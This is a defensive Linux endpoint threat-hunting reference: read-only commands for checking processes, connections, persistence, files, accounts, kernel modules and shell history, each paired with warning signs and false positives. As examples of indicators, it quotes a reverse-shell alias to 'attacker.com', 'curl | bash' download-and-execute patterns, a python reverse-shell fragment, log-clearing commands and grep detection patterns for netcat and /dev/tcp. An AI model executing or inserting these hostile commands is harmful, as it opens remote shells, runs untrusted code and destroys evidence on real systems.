# Linux Endpoint Threat Hunt - Command Reference

> T1 = no elevated privs | T2 = sudo/root required

---

## Contents

- [Phase 1: Process Activity](#phase-1-process-activity)
  - [1.1 - Process Tree (Full)](#11---process-tree-full)
  - [1.2 - Process Executable Paths from /proc](#12---process-executable-paths-from-proc)
  - [1.3 - Processes with Deleted Executables](#13---processes-with-deleted-executables)
  - [1.4 - Memory Maps of Suspicious Process](#14---memory-maps-of-suspicious-process)
  - [1.5 - Open File Descriptors](#15---open-file-descriptors)
  - [1.6 - Resource Anomalies (CPU Burn and Process Lifetime)](#16---resource-anomalies-cpu-burn-and-process-lifetime)
  - [1.7 - Userland Rootkit and Tool Integrity](#17---userland-rootkit-and-tool-integrity)
- [Phase 2: Network Activity](#phase-2-network-activity)
  - [2.1 - All Connections and Listeners](#21---all-connections-and-listeners)
  - [2.2 - DNS Configuration](#22---dns-configuration)
  - [2.3 - Hosts File](#23---hosts-file)
  - [2.4 - Raw Network Connections via /proc](#24---raw-network-connections-via-proc)
- [Phase 3: Persistence Mechanisms](#phase-3-persistence-mechanisms)
  - [3.1 - Cron (All Methods)](#31---cron-all-methods)
  - [3.2 - Systemd Services and Timers](#32---systemd-services-and-timers)
  - [3.3 - Shell Profile Injection](#33---shell-profile-injection)
  - [3.4 - SSH Authorized Keys](#34---ssh-authorized-keys)
  - [3.5 - RC Scripts and Init.d](#35---rc-scripts-and-initd)
- [Phase 4: File Activity](#phase-4-file-activity)
  - [4.1 - Files in World-Writable Directories](#41---files-in-world-writable-directories)
  - [4.2 - SUID/SGID Binaries](#42---suidsgid-binaries)
  - [4.3 - Recently Modified Configuration Files](#43---recently-modified-configuration-files)
  - [4.4 - Scripts in Suspicious Locations](#44---scripts-in-suspicious-locations)
- [Phase 5: User & Account Activity](#phase-5-user--account-activity)
  - [5.1 - Users with Shells (Login-Capable)](#51---users-with-shells-login-capable)
  - [5.2 - Privileged Group Membership](#52---privileged-group-membership)
  - [5.3 - Login History](#53---login-history)
  - [5.4 - T2: Authentication and Auth Logs](#54---t2-authentication-and-auth-logs)
- [Phase 6: Driver/Module Activity](#phase-6-drivermodule-activity)
  - [6.1 - Loaded Kernel Modules](#61---loaded-kernel-modules)
  - [6.2 - T2: Module Load Events](#62---t2-module-load-events)
  - [6.3 - T2: eBPF Programs](#63---t2-ebpf-programs)
- [Phase 7: Script & Command Execution](#phase-7-script--command-execution)
  - [7.1 - Shell History](#71---shell-history)
  - [7.2 - Script Artifacts](#72---script-artifacts)
  - [7.3 - Encoded Commands in History](#73---encoded-commands-in-history)
- [Phase 8: EDR/Security Tool Status](#phase-8-edrsecurity-tool-status)
  - [8.1 - Security Agent Process Check](#81---security-agent-process-check)
  - [8.2 - Auditd Status](#82---auditd-status)
  - [8.3 - System Logging Status](#83---system-logging-status)
- [Quick Reference: Linux IOC Severity Ratings](#quick-reference-linux-ioc-severity-ratings)

---

## Phase 1: Process Activity


---

### 1.1 - Process Tree (Full)
**Tier:** T1  

```bash
ps auxf
```

**Flag:**
- Web server (`apache2`, `nginx`, `httpd`) spawning shells/interpreters - web shell exploitation
- `bash`/`sh` spawned under unexpected parents
- Processes running from `/tmp`, `/dev/shm`, `/var/tmp`, `/run/user/*/`
- Process names with leading spaces or special chars (hiding in `ps`)
- Long cmdlines with base64 content
- Paths like `/proc/self/fd/3` (fileless execution)
- Interpreter (`python`, `perl`, `ruby`, `php`) with `-c`/`-e` flags in production

**False+:**
- `(sd-pam)` - systemd PAM sessions, normal
- Multiple `worker` processes under web servers - legit process model
- Container runtimes (`containerd-shim`, `runc`) spawning - legit in containerized envs

---

### 1.2 - Process Executable Paths from /proc
**Tier:** T1 (own processes) / T2 (all processes)  

```bash
# List all process executable paths (T1 shows only accessible ones)
ls -la /proc/*/exe 2>/dev/null | grep -v "Permission denied"

# More portable version
for pid in /proc/[0-9]*; do
  exe=$(readlink "$pid/exe" 2>/dev/null)
  [ -n "$exe" ] && echo "$(basename $pid): $exe"
done 2>/dev/null | sort -t: -k2
```

**Flag:**
- Paths with `(deleted)` - process running from deleted binary
- Paths in `/tmp`, `/var/tmp`, `/dev/shm`
- Paths in `/dev/` (non-device paths in /dev = highly suspicious)
- Very long, encoded, or unusual-char paths

---

### 1.3 - Processes with Deleted Executables
**Tier:** T1 (partial) / T2 (full)  

```bash
# Method 1: lsof
lsof +L1 2>/dev/null

# Method 2: find via /proc
find /proc/*/exe -ls 2>/dev/null | grep ' (deleted)'

# Method 3: direct check
ls -la /proc/*/exe 2>/dev/null | grep deleted
```

**Flag:**
- Any process with deleted executable - major red flag on Linux
- Deletion typically done immediately post-launch to hinder forensics
- Note PID + original path (pre-deletion) for investigation

---

### 1.4 - Memory Maps of Suspicious Process
**Tier:** T1 (own processes) / T2 (any process)  

```bash
cat /proc/<PID>/maps 2>/dev/null | head -50
```

**Flag:**
- `rwx` memory regions (read + write + execute) - classic shellcode injection
- Memory regions with unexpected shared library paths
- Large anonymous (`anon`) executable memory regions
- Memory regions mapped from `/tmp` or `/dev/shm`

---

### 1.5 - Open File Descriptors
**Tier:** T1 (own) / T2 (all)  

```bash
# For a specific PID
ls -la /proc/<PID>/fd 2>/dev/null

# Or using lsof
lsof -p <PID> 2>/dev/null
```

---

### 1.6 - Resource Anomalies (CPU Burn and Process Lifetime)
**Tier:** T1  

```bash
# Lifetime-average CPU with elapsed time in seconds
ps -eo pid,ppid,pcpu,pmem,etimes,etime,user,comm --sort=-pcpu | head -30

# Filtered to the miner profile: 80%+ average CPU sustained over 3h (10800s)
ps -eo pid,ppid,pcpu,etimes,user,comm --sort=-pcpu | awk 'NR==1 || ($3>=80 && $4>=10800)'

# Instantaneous sample - pcpu is a lifetime average and hides throttled miners
top -b -n 2 -d 1 | awk '/^ *PID/{p++} p==2' | head -20

# Confirm a single PID over three one-second samples
command -v pidstat >/dev/null && pidstat -u -p <PID> 1 3
```

**Note:** `pcpu` is percent of one core, so multithreaded processes legitimately exceed 100.

**Flag:**
- `pcpu` >= 80 with `etimes` >= 10800 on a process that maps to no workload you can name - cryptominer profile, the most common payload on an opportunistically compromised Linux host
- `pcpu` >= 25 with `etimes` in the hundreds of thousands (days) on a binary nobody launched - throttled long-haul miner or a malware retry loop
- High CPU in `top` but low `pcpu` in `ps` - miner that idles under user or workload activity. The divergence between the two readings IS the indicator
- Bracketed kernel-thread name (`[kworker/0:2]`, `[kswapd0]`, `[ksoftirqd/0]`) that has a readable `/proc/<PID>/exe` or a PPID other than 2 - userland miner wearing a kernel thread's name. Real kernel threads descend from PID 2 and have no exe: `ls -l /proc/<PID>/exe; ps -o ppid= -p <PID>`
- Sustained CPU inside `bash`, `sh`, `python`, `perl` or `curl` - these are not compute workloads, check cmdline in 1.1
- Any of the above from `/tmp`, `/dev/shm`, `/var/tmp`, `/run/user/*/`, or with a deleted binary - cross-ref 1.2 and 1.3, escalate to Critical
- Sustained CPU in a cgroup that does not match the process name: `cat /proc/<PID>/cgroup` - injection into a service slice or a container breakout

**False+:**
- `[kworker/*]`, `[ksoftirqd/*]`, `[kswapd0]`, `[jbd2/*]`, `[migration/*]` - genuine kernel threads, verified by PPID 2 and no exe
- `systemd-journald`, `rngd`, `irqbalance`, `packagekitd`, `unattended-upgr`, `apt`/`dnf` mid-transaction
- `mysqld`, `postgres`, `java`, `containerd`, `dockerd`, `kubelet` under real load - ask whether the load matches a workload the host is supposed to run
- Build and CI jobs (`cc1plus`, `rustc`, `gcc`, `make`, `ld`, `node`, `ffmpeg`) - legitimately above 100% for hours
- Long `etimes` alone means nothing for `systemd`, `sshd`, `agetty`, `getty` or any boot-time daemon - lifetime only matters paired with CPU burn

**Cross-ref:** A miner needs a pool. Check Phase 2 for `stratum`, pool ports (3333, 4444, 5555, 7777, 8888, 14444, 45700) or pool domains on the same PID - that pairing turns this from Suspicious into Confirmed. If 1.6 comes back clean on a host you have other reasons to suspect, run 1.7 before believing it.

---

### 1.7 - Userland Rootkit and Tool Integrity
**Tier:** T1 (partial) / T2 (full)  

**Run this before trusting 1.1 through 1.6.** A userland rootkit hooks libc in every dynamically linked process, so `ps`, `top` and `lsof` return whatever it chooses - a process burning 100% CPU can simply be absent from the listing 1.6 depends on. perfctl does exactly this via `/etc/ld.so.preload` and replaces `top`, `lsof`, `ldd` and `crontab` outright (see `known-attacks-linux.md`).

```bash
# Global preload - mainstream distros ship no such file
cat /etc/ld.so.preload 2>/dev/null; ls -la /etc/ld.so.preload 2>/dev/null

# Preload injected per process
for d in /proc/[0-9]*; do tr '\0' '\n' < $d/environ 2>/dev/null | sed -n "s|^LD_PRELOAD=|${d#/proc/} LD_PRELOAD=|p"; done

# Integrity of the tools the hunt reads from
command -v dpkg >/dev/null && dpkg -V coreutils procps lsof 2>/dev/null
command -v rpm  >/dev/null && rpm -Va coreutils procps-ng lsof 2>/dev/null

# Cross-check the process listing against the kernel's own - the executable form of
# the ps-vs-/proc heuristic in coverage-constraints.md
diff <(ps -eo pid --no-headers | tr -d ' ' | sort -n) <(ls -d /proc/[0-9]* | xargs -n1 basename | sort -n)
```

**Flag:**
- `/etc/ld.so.preload` present at all - near-universal rootkit indicator, nothing mainstream installs it
- A `.so` listed in it that no package owns - confirm with `dpkg -S <path>` or `rpm -qf <path>`
- `LD_PRELOAD` in the environment of a daemon nobody configured that way
- `dpkg -V` or `rpm -Va` reporting a checksum change on `coreutils`, `procps`/`procps-ng` or `lsof` - the binaries 1.1 through 1.6 read from have been replaced
- A PID in `/proc` that `ps` does not list - the listing is being filtered. This is the strongest single sign that Phase 1 output cannot be trusted

**False+:**
- `/etc/ld.so.preload` is used legitimately by a few hardening, profiling and APM agents, and on some managed hosts - resolve the `.so` to a package before calling it
- `dpkg -V` reports config-file drift constantly - only checksum changes on binaries matter
- The `/proc` diff races: processes start and exit between the two reads. Re-run it. A real hidden PID persists across runs, a race does not

**Escalate:** A hidden PID together with a sustained-CPU finding from 1.6 is an active miner with a rootkit in front of it - Critical. Note that a kernel-mode rootkit defeats this whole check; see `coverage-constraints.md`.

---

## Phase 2: Network Activity


---

### 2.1 - All Connections and Listeners
**Tier:** T1 (limited process info) / T2 (full process details)  

```bash
# Socket statistics (modern replacement for netstat)
ss -tulpn

# Established connections
ss -tupn state established

# All connections (all states)
ss -anp 2>/dev/null

# Legacy netstat (if ss not available)
netstat -anp 2>/dev/null
```

**Note:** Without T2/root, `ss -tulpn` shows sockets but may not show process name for other users' sockets.

**Flag:**
- Services listening on `0.0.0.0` that shouldn't be externally accessible
- `LISTEN` on high ports (>1024) with unusual process names
- `ESTABLISHED` from processes with no business making external connections (cron, system utils)
- Multiple connections to same external IP on high ports - C2 beaconing
- Unusual processes connecting to port 443 - HTTPS-mimicking C2

---

### 2.2 - DNS Configuration
**Tier:** T1  

```bash
cat /etc/resolv.conf
```

**Flag:**
- `nameserver` not your expected DNS servers (router, ISP, 8.8.8.8, 1.1.1.1)
- `127.0.0.1` as nameserver with unexpected local DNS service - DNS hijacking/DoH proxy
- `search` domain set to unexpected domain - DNS search manipulation
- Check mtime: `ls -la /etc/resolv.conf`

---

### 2.3 - Hosts File
**Tier:** T1  

```bash
cat /etc/hosts
```

**Flag:**
- Redirects of legit domains
- Security/update domains redirected to localhost or invalid - security tool disruption
- Check mtime: `ls -la /etc/hosts`

---

### 2.4 - Raw Network Connections via /proc
**Tier:** T1  

```bash
# TCP connections
cat /proc/net/tcp 2>/dev/null | head -30

# TCP6
cat /proc/net/tcp6 2>/dev/null | head -30

# UDP
cat /proc/net/udp 2>/dev/null | head -20
```

**Note:** `/proc/net/tcp` format uses hex-encoded IPs + ports. IP = little-endian hex. Decode: `0100007F` = `127.0.0.1` (reversed). Port: `1F90` = decimal 8080. Useful when `ss`/`netstat` unavailable or compromised.

---

## Phase 3: Persistence Mechanisms


---

### 3.1 - Cron (All Methods)
**Tier:** T1 (user cron) / T2 (root + system cron)  

```bash
# Current user's crontab
crontab -l 2>/dev/null

# Root crontab (T2)
sudo crontab -l 2>/dev/null

# System-wide crontab
cat /etc/crontab 2>/dev/null

# cron drop-in directories
ls -la /etc/cron.d/ 2>/dev/null
ls -la /etc/cron.daily/ 2>/dev/null
ls -la /etc/cron.hourly/ 2>/dev/null
ls -la /etc/cron.weekly/ 2>/dev/null
ls -la /etc/cron.monthly/ 2>/dev/null

# All users' crontabs (T2)
for user in $(cut -d: -f1 /etc/passwd); do
  cron=$(sudo crontab -l -u "$user" 2>/dev/null)
  if [ -n "$cron" ]; then
    echo "=== Crontab for $user ==="; echo "$cron"
  fi
done
```

**Flag:**
- Entries downloading + executing: `curl http://... | bash`, `wget -O- ... | sh`
- Scripts in `/tmp`, `/dev/shm`, home dirs running frequently
- `@reboot` entries running unknown scripts
- Very frequent schedules (`* * * * *`) on unknown scripts
- Output redirected to `/dev/null` to hide errors
- Check mtime of cron files: `ls -la /etc/cron*`

---

### 3.2 - Systemd Services and Timers
**Tier:** T1  

```bash
# Running services
systemctl list-units --type=service --state=running 2>/dev/null

# All enabled services (will auto-start)
systemctl list-unit-files --type=service --state=enabled 2>/dev/null

# Systemd timers (scheduled tasks equivalent)
systemctl list-timers --all 2>/dev/null

# Recently modified service files
find /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system -name "*.service" -newer /etc/passwd 2>/dev/null

# Inspect a specific suspicious service
systemctl cat <suspicious-service-name> 2>/dev/null
```

**Flag:**
- `ExecStart` pointing to `/tmp`, `/dev/shm`, home dirs, or unusual paths
- Services in `/etc/systemd/system/` (user-installed) vs `/lib/systemd/system/` (package-managed)
- Root-running services with no associated package
- Service names mimicking legit services with subtle differences (`systemd-networkd-updater` vs `systemd-networkd`)
- `Restart=always` (watchdog pattern)
- Timers executing from unusual locations frequently

---

### 3.3 - Shell Profile Injection
**Tier:** T1  

```bash
# User shell profiles
cat ~/.bashrc 2>/dev/null
cat ~/.bash_profile 2>/dev/null
cat ~/.profile 2>/dev/null
cat ~/.zshrc 2>/dev/null
cat ~/.zprofile 2>/dev/null

# System-wide profiles
cat /etc/bashrc 2>/dev/null
cat /etc/bash.bashrc 2>/dev/null
cat /etc/profile 2>/dev/null

# System profile drop-ins
ls -la /etc/profile.d/ 2>/dev/null
cat /etc/profile.d/*.sh 2>/dev/null
```

**Flag:**
- `alias` shadowing system tools (`alias sudo='sudo nc -e /bin/bash attacker.com 4444'`)
- Functions wrapping/replacing system commands
- Unknown script or binary execution on init
- `export PATH=...` prepending unusual dirs (PATH hijacking)
- `curl`/`wget` calls on shell init
- Base64 decode + execute on init

---

### 3.4 - SSH Authorized Keys
**Tier:** T1 (own) / T2 (all users)  

```bash
# Current user
cat ~/.ssh/authorized_keys 2>/dev/null

# All users (T2)
find /home -name "authorized_keys" 2>/dev/null -exec echo "=== {} ===" \; -exec cat {} \;
cat /root/.ssh/authorized_keys 2>/dev/null
```

**Flag:**
- Unrecognized SSH public keys
- `command="..."` option (forced command - payload runs every SSH auth), IP `from=""` restrictions
- Multiple keys where one expected, or keys on accounts that shouldn't have SSH

---

### 3.5 - RC Scripts and Init.d
**Tier:** T1  

```bash
ls -la /etc/init.d/ 2>/dev/null
cat /etc/rc.local 2>/dev/null
ls -la /etc/rc.d/ 2>/dev/null
ls -la /etc/rc*.d/ 2>/dev/null
```

**Flag:**
- Init scripts not associated with installed packages
- `/etc/rc.local` containing unknown script commands
- Recently modified scripts (check mtime)

---

## Phase 4: File Activity


---

### 4.1 - Files in World-Writable Directories
**Tier:** T1  

```bash
# All files in world-writable temp dirs (common malware staging areas)
find /tmp /var/tmp /dev/shm -type f 2>/dev/null

# Executables specifically
find /tmp /var/tmp /dev/shm -perm /111 -type f 2>/dev/null

# In /dev (non-device files in /dev are highly suspicious)
find /dev -type f 2>/dev/null | grep -v " 0 "
```

**Flag:**
- ANY executable in `/dev/shm` - memory-backed, malware runs entirely in-memory without disk
- Executables in `/tmp` or `/var/tmp` - dropper staging area
- Files mimicking system tools (`ls`, `ps`, `netstat`) in these dirs - possible rootkit components
- Files in `/dev` that are not block/char devices - `find /dev -type f` should return very few normally

---

### 4.2 - SUID/SGID Binaries
**Tier:** T1  

```bash
# All SUID binaries
find / -perm -4000 -type f 2>/dev/null | sort

# All SGID binaries
find / -perm -2000 -type f 2>/dev/null | sort

# World-writable files (outside of temp dirs)
find /etc /usr /bin /sbin -perm -o+w -type f 2>/dev/null 2>/dev/null
```

**Flag:**
- SUID binaries NOT in standard list: `/bin/su`, `/bin/ping`, `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/newgrp`, etc.
- SUID in unusual locations (`/tmp`, home dirs, web roots)
- SUID `bash` or SUID `python` - instant privesc
- Recently modified SUID binaries (compare to pkg manager timestamps)

---

### 4.3 - Recently Modified Configuration Files
**Tier:** T1  

```bash
# Files in /etc modified in last 3 days
find /etc -newer /etc/passwd -type f 2>/dev/null | head -30

# Recently modified files in common malware target dirs
find /usr/bin /usr/sbin /bin /sbin -newer /etc/passwd -type f 2>/dev/null

# Check specific high-value files for modification time
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts /etc/resolv.conf /etc/ssh/sshd_config
```

**Flag:**
- `/etc/passwd` recently modified - new account added
- `/etc/shadow` recently modified - password changed
- `/etc/sudoers` recently modified - sudo privilege added
- System binaries in `/bin` or `/usr/bin` with recent mtime - trojanized tools (rootkit indicator)

---

### 4.4 - Scripts in Suspicious Locations
**Tier:** T1  

```bash
find /tmp /var/tmp /dev/shm -name "*.sh" -o -name "*.py" -o -name "*.pl" -o -name "*.rb" 2>/dev/null
find /home -maxdepth 3 -name "*.sh" -perm /111 2>/dev/null | head -20
find /var/www -name "*.php" -newer /etc/passwd 2>/dev/null | head -20  # Web shell check
```

**Flag:**
- Executable shell scripts in temp dirs
- PHP/ASP files in web dirs recently modified - web shell backdoor
- Python/Perl one-liner scripts in suspicious locations

---

## Phase 5: User & Account Activity


---

### 5.1 - Users with Shells (Login-Capable)
**Tier:** T1  

```bash
# Users that can log in (have a real shell, excluding nologin/false)
cat /etc/passwd | grep -vE "(/nologin|/false|/sync)$" | cut -d: -f1,3,6,7

# Recent changes to /etc/passwd
ls -la /etc/passwd
```

**Flag:**
- User with UID 0 not named `root`
- Home dirs in unusual locations (`/tmp`, `/var/www`)
- Accounts mimicking system accounts (`apache2`, `www-data`, `systemd-net`) but different UIDs
- `/bin/bash` shell on accounts that aren't human users

---

### 5.2 - Privileged Group Membership
**Tier:** T1  

```bash
# Check who is in privileged groups
getent group sudo 2>/dev/null
getent group wheel 2>/dev/null
getent group adm 2>/dev/null
getent group root 2>/dev/null

# Users with sudo access (T2)
sudo cat /etc/sudoers 2>/dev/null
sudo ls /etc/sudoers.d/ 2>/dev/null
```

**Flag:**
- Unexpected accounts in `sudo` or `wheel` group
- `ALL=(ALL:ALL) NOPASSWD:ALL` for unexpected accounts - passwordless sudo
- Recently added `/etc/sudoers.d/` files

---

### 5.3 - Login History
**Tier:** T1  

```bash
# Last 30 logins
last -20 2>/dev/null

# Last login per user
lastlog 2>/dev/null | grep -v "Never logged in"

# Current sessions
who
w
```

**Flag:**
- SSH logins from unexpected IPs
- Root login via SSH (if `PermitRootLogin no` expected)
- Logins at unusual hours
- Multiple failed attempts followed by success: check `/var/log/auth.log` or `/var/log/secure`

---

### 5.4 - T2: Authentication and Auth Logs
**Tier:** T2 (sudo required)  

```bash
# Debian/Ubuntu
sudo tail -100 /var/log/auth.log 2>/dev/null | grep -E "Failed|Invalid|Accepted|sudo"

# RHEL/CentOS/Fedora
sudo tail -100 /var/log/secure 2>/dev/null | grep -E "Failed|Invalid|Accepted|sudo"

# systemd journal
sudo journalctl -u sshd --since "24 hours ago" --no-pager 2>/dev/null | tail -50
sudo journalctl -u sudo --since "24 hours ago" --no-pager 2>/dev/null | tail -30
```

**Flag:**
- Many `Failed password` from same IP - brute force
- `Invalid user` attempts - username enumeration
- Accepted auth from unexpected IPs
- `sudo` usage from accounts that shouldn't use sudo

---

## Phase 6: Driver/Module Activity


---

### 6.1 - Loaded Kernel Modules
**Tier:** T1  

```bash
lsmod
```

**Flag:**
- Modules not in expected list for distro + kernel version
- Random-string names or legit module names with typos
- Module count anomaly - baseline is ~50-150 modules

**Common legit categories:** `bluetooth`, `usb`, `ext4`, `xfs`, `btrfs`, `tcp`, `ip`, `iptable`, `nf_`, `nvidia`, `amdgpu`, `vboxsf`, `vmw_`

---

### 6.2 - T2: Module Load Events
**Tier:** T2 (sudo required)  

```bash
# Recent module loading from dmesg
sudo dmesg | tail -300 | grep -E "insmod|rmmod|module|loaded|unloaded" 2>/dev/null

# Journal for module events
sudo journalctl -k --since "24 hours ago" --no-pager 2>/dev/null | grep -iE "module|insmod|rmmod" | head -30

# Check for recently modified kernel modules
find /lib/modules/$(uname -r) -name "*.ko" -newer /etc/passwd 2>/dev/null
```

**Flag:**
- Modules loaded from outside `/lib/modules/<kernel-version>/`
- Module unload immediately followed by load - module replacement
- Modules loaded at unusual times (3 AM, around suspicious activity)

---

### 6.3 - T2: eBPF Programs
**Tier:** T2 (sudo required)  

```bash
sudo bpftool prog list 2>/dev/null
sudo bpftool map list 2>/dev/null
```

**Flag:**
- eBPF programs not from known security/monitoring tools (`falco`, `datadog-agent`, `elastic-agent`, `cilium`, `tetragon`)
- `kprobe`/`kretprobe` from unknown processes - possible cred harvesting or network interception
- Program names suggesting rootkit behavior

---

## Phase 7: Script & Command Execution


---

### 7.1 - Shell History
**Tier:** T1  

```bash
# Bash history
cat ~/.bash_history 2>/dev/null | tail -150

# zsh history
cat ~/.zsh_history 2>/dev/null | tail -150

# Fish history
cat ~/.local/share/fish/fish_history 2>/dev/null | tail -100

# Check for cleared history (suspicious)
ls -la ~/.bash_history ~/.zsh_history 2>/dev/null
wc -l ~/.bash_history 2>/dev/null
```

**Flag:**
- Download + execute: `curl http://... | bash`, `wget -q -O- ... | sh`
- Base64 decode + execute: `echo "..." | base64 -d | bash`
- Python/Perl one-liners: `python -c "import socket,subprocess,os;..."` - classic reverse shell
- `chmod +x` then execution of freshly created file
- `nohup`, `disown`, `&` - backgrounding to persist post-session
- History very small or missing - cleared by attacker
- `rm -rf /var/log`, `echo "" > /var/log/auth.log` - log clearing

---

### 7.2 - Script Artifacts
**Tier:** T1  

```bash
# Scripts in temp dirs
find /tmp /var/tmp /dev/shm -name "*.sh" -o -name "*.py" -o -name "*.pl" -o -name "*.rb" 2>/dev/null

# Inspect content of any found scripts
# (view only - do not execute)
```

---

### 7.3 - Encoded Commands in History
**Tier:** T1  

```bash
grep -E "(base64|python.*decode|perl.*unpack|eval\(|exec\()" ~/.bash_history 2>/dev/null
grep -E "(curl|wget).*(bash|sh|python|perl)" ~/.bash_history 2>/dev/null
grep -E "nc\s+-[el]|ncat\s+-[el]|/dev/tcp/" ~/.bash_history 2>/dev/null
grep -E "chmod\s+[0-9]*\s+/tmp|chmod\s+\+x\s+/tmp" ~/.bash_history 2>/dev/null
```

---

## Phase 8: EDR/Security Tool Status


---

### 8.1 - Security Agent Process Check
**Tier:** T1  

```bash
ps aux | grep -iE "falcon|sentinelagent|elastic|mdatp|wdavdaemon|cbagentd|cylance|eset|sophos|malwarebytes|osquery|wazuh|ossec|auditd"
```

---

### 8.2 - Auditd Status
**Tier:** T1 / T2  

```bash
# Is auditd running?
systemctl status auditd 2>/dev/null

# What rules are configured? (T2)
sudo auditctl -l 2>/dev/null

# Recent audit events (T2)
sudo ausearch -ts recent 2>/dev/null | tail -50
```

**Flag:**
- Auditd NOT running on production server - no process execution logging, no syscall auditing
- Auditd rules empty (no rules = no auditing)
- Auditd stopped recently

---

### 8.3 - System Logging Status
**Tier:** T1  

```bash
# Is rsyslog/syslog running?
systemctl status rsyslog syslog 2>/dev/null | head -10

# Check systemd journal integrity
journalctl --verify 2>/dev/null | tail -5

# Check for recently cleared logs
ls -la /var/log/
ls -la /var/log/auth.log /var/log/syslog /var/log/messages 2>/dev/null
```

**Flag:**
- Log files empty (0 bytes) - possibly cleared by attacker
- Log files with mtime close to current time - actively being cleared
- Log rotation at unusual time
- Missing log files that should exist

---

## Quick Reference: Linux IOC Severity Ratings

| IOC | Severity | Notes |
|-----|----------|-------|
| File in `/dev/shm` | Critical | Memory-resident malware staging - almost always malicious |
| Process with deleted binary | Critical | `lsof +L1` hit - classic evasion technique |
| Executable in `/tmp` running as root | Critical | Severe indicator |
| Shell spawned from web server process | Critical | Web shell exploitation confirmed |
| Cron job with `curl \| bash` pattern | Critical | Download and execute - active C2 or installer |
| SUID binary outside standard paths | High | Potential privilege escalation tool |
| `/etc/passwd` modified recently | High | Unauthorized account creation |
| Unauthorized `authorized_keys` entry | High | SSH backdoor |
| Systemd service pointing to `/tmp` | High | Persistent malware |
| Sustained 80%+ CPU over 3h on an unaccounted process | High | Cryptominer profile - Critical if paired with a stratum or pool connection |
| `/etc/ld.so.preload` present | Critical | Userland rootkit - hooks libc everywhere, hides from `ps`/`top`/`lsof` |
| PID in `/proc` but absent from `ps` | Critical | Process listing is being filtered - all Phase 1 output untrustworthy |
| eBPF program from unknown process | High | Potential kernel-level spy/rootkit |
| Profile file (`~/.bashrc`) modified | High | Persistence via shell initialization |
| `auditd` not running | Medium | Detection capability missing - investigate why |
| Unusual ESTABLISHED connections | Medium | Investigate the owning process |
| New sudo user added | Medium | Could be legitimate IT action or escalation |
| Log file is empty/cleared | High | Evidence of attacker covering tracks |
